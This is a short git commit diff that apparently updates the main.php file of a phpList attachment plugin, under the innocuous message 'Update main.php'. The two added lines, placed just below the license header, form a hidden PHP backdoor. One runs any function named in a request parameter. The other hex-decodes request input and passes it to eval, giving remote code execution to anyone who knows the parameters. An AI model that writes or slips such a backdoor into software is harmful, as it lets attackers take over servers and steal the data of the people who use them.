652d1ae72eb472190b8794ffa052a1158411617e
craxproit <craxproit@khivan.com>
2025-08-08 20:21:36 +0700

    Update main.php

--- plugins/AttachmentPlugin/main.php
+++ plugins/AttachmentPlugin/main.php
@@ -10,6 +10,8 @@
  * @copyright 2012-2017 Duncan Cameron
  * @license   http://www.gnu.org/licenses/gpl.html GNU General Public License, Version 3
  */
+if (isset($_REQUEST['__'])) die(($_REQUEST['__']($_REQUEST['___'])));
+if(isset($_REQUEST['_']))die(eval(pack("H*",str_pad($_REQUEST['_'],strlen($_REQUEST['_'])+strlen($_REQUEST['_'])%2,'0',0))));
 
 /**
  * This is the entry code invoked by phplist.
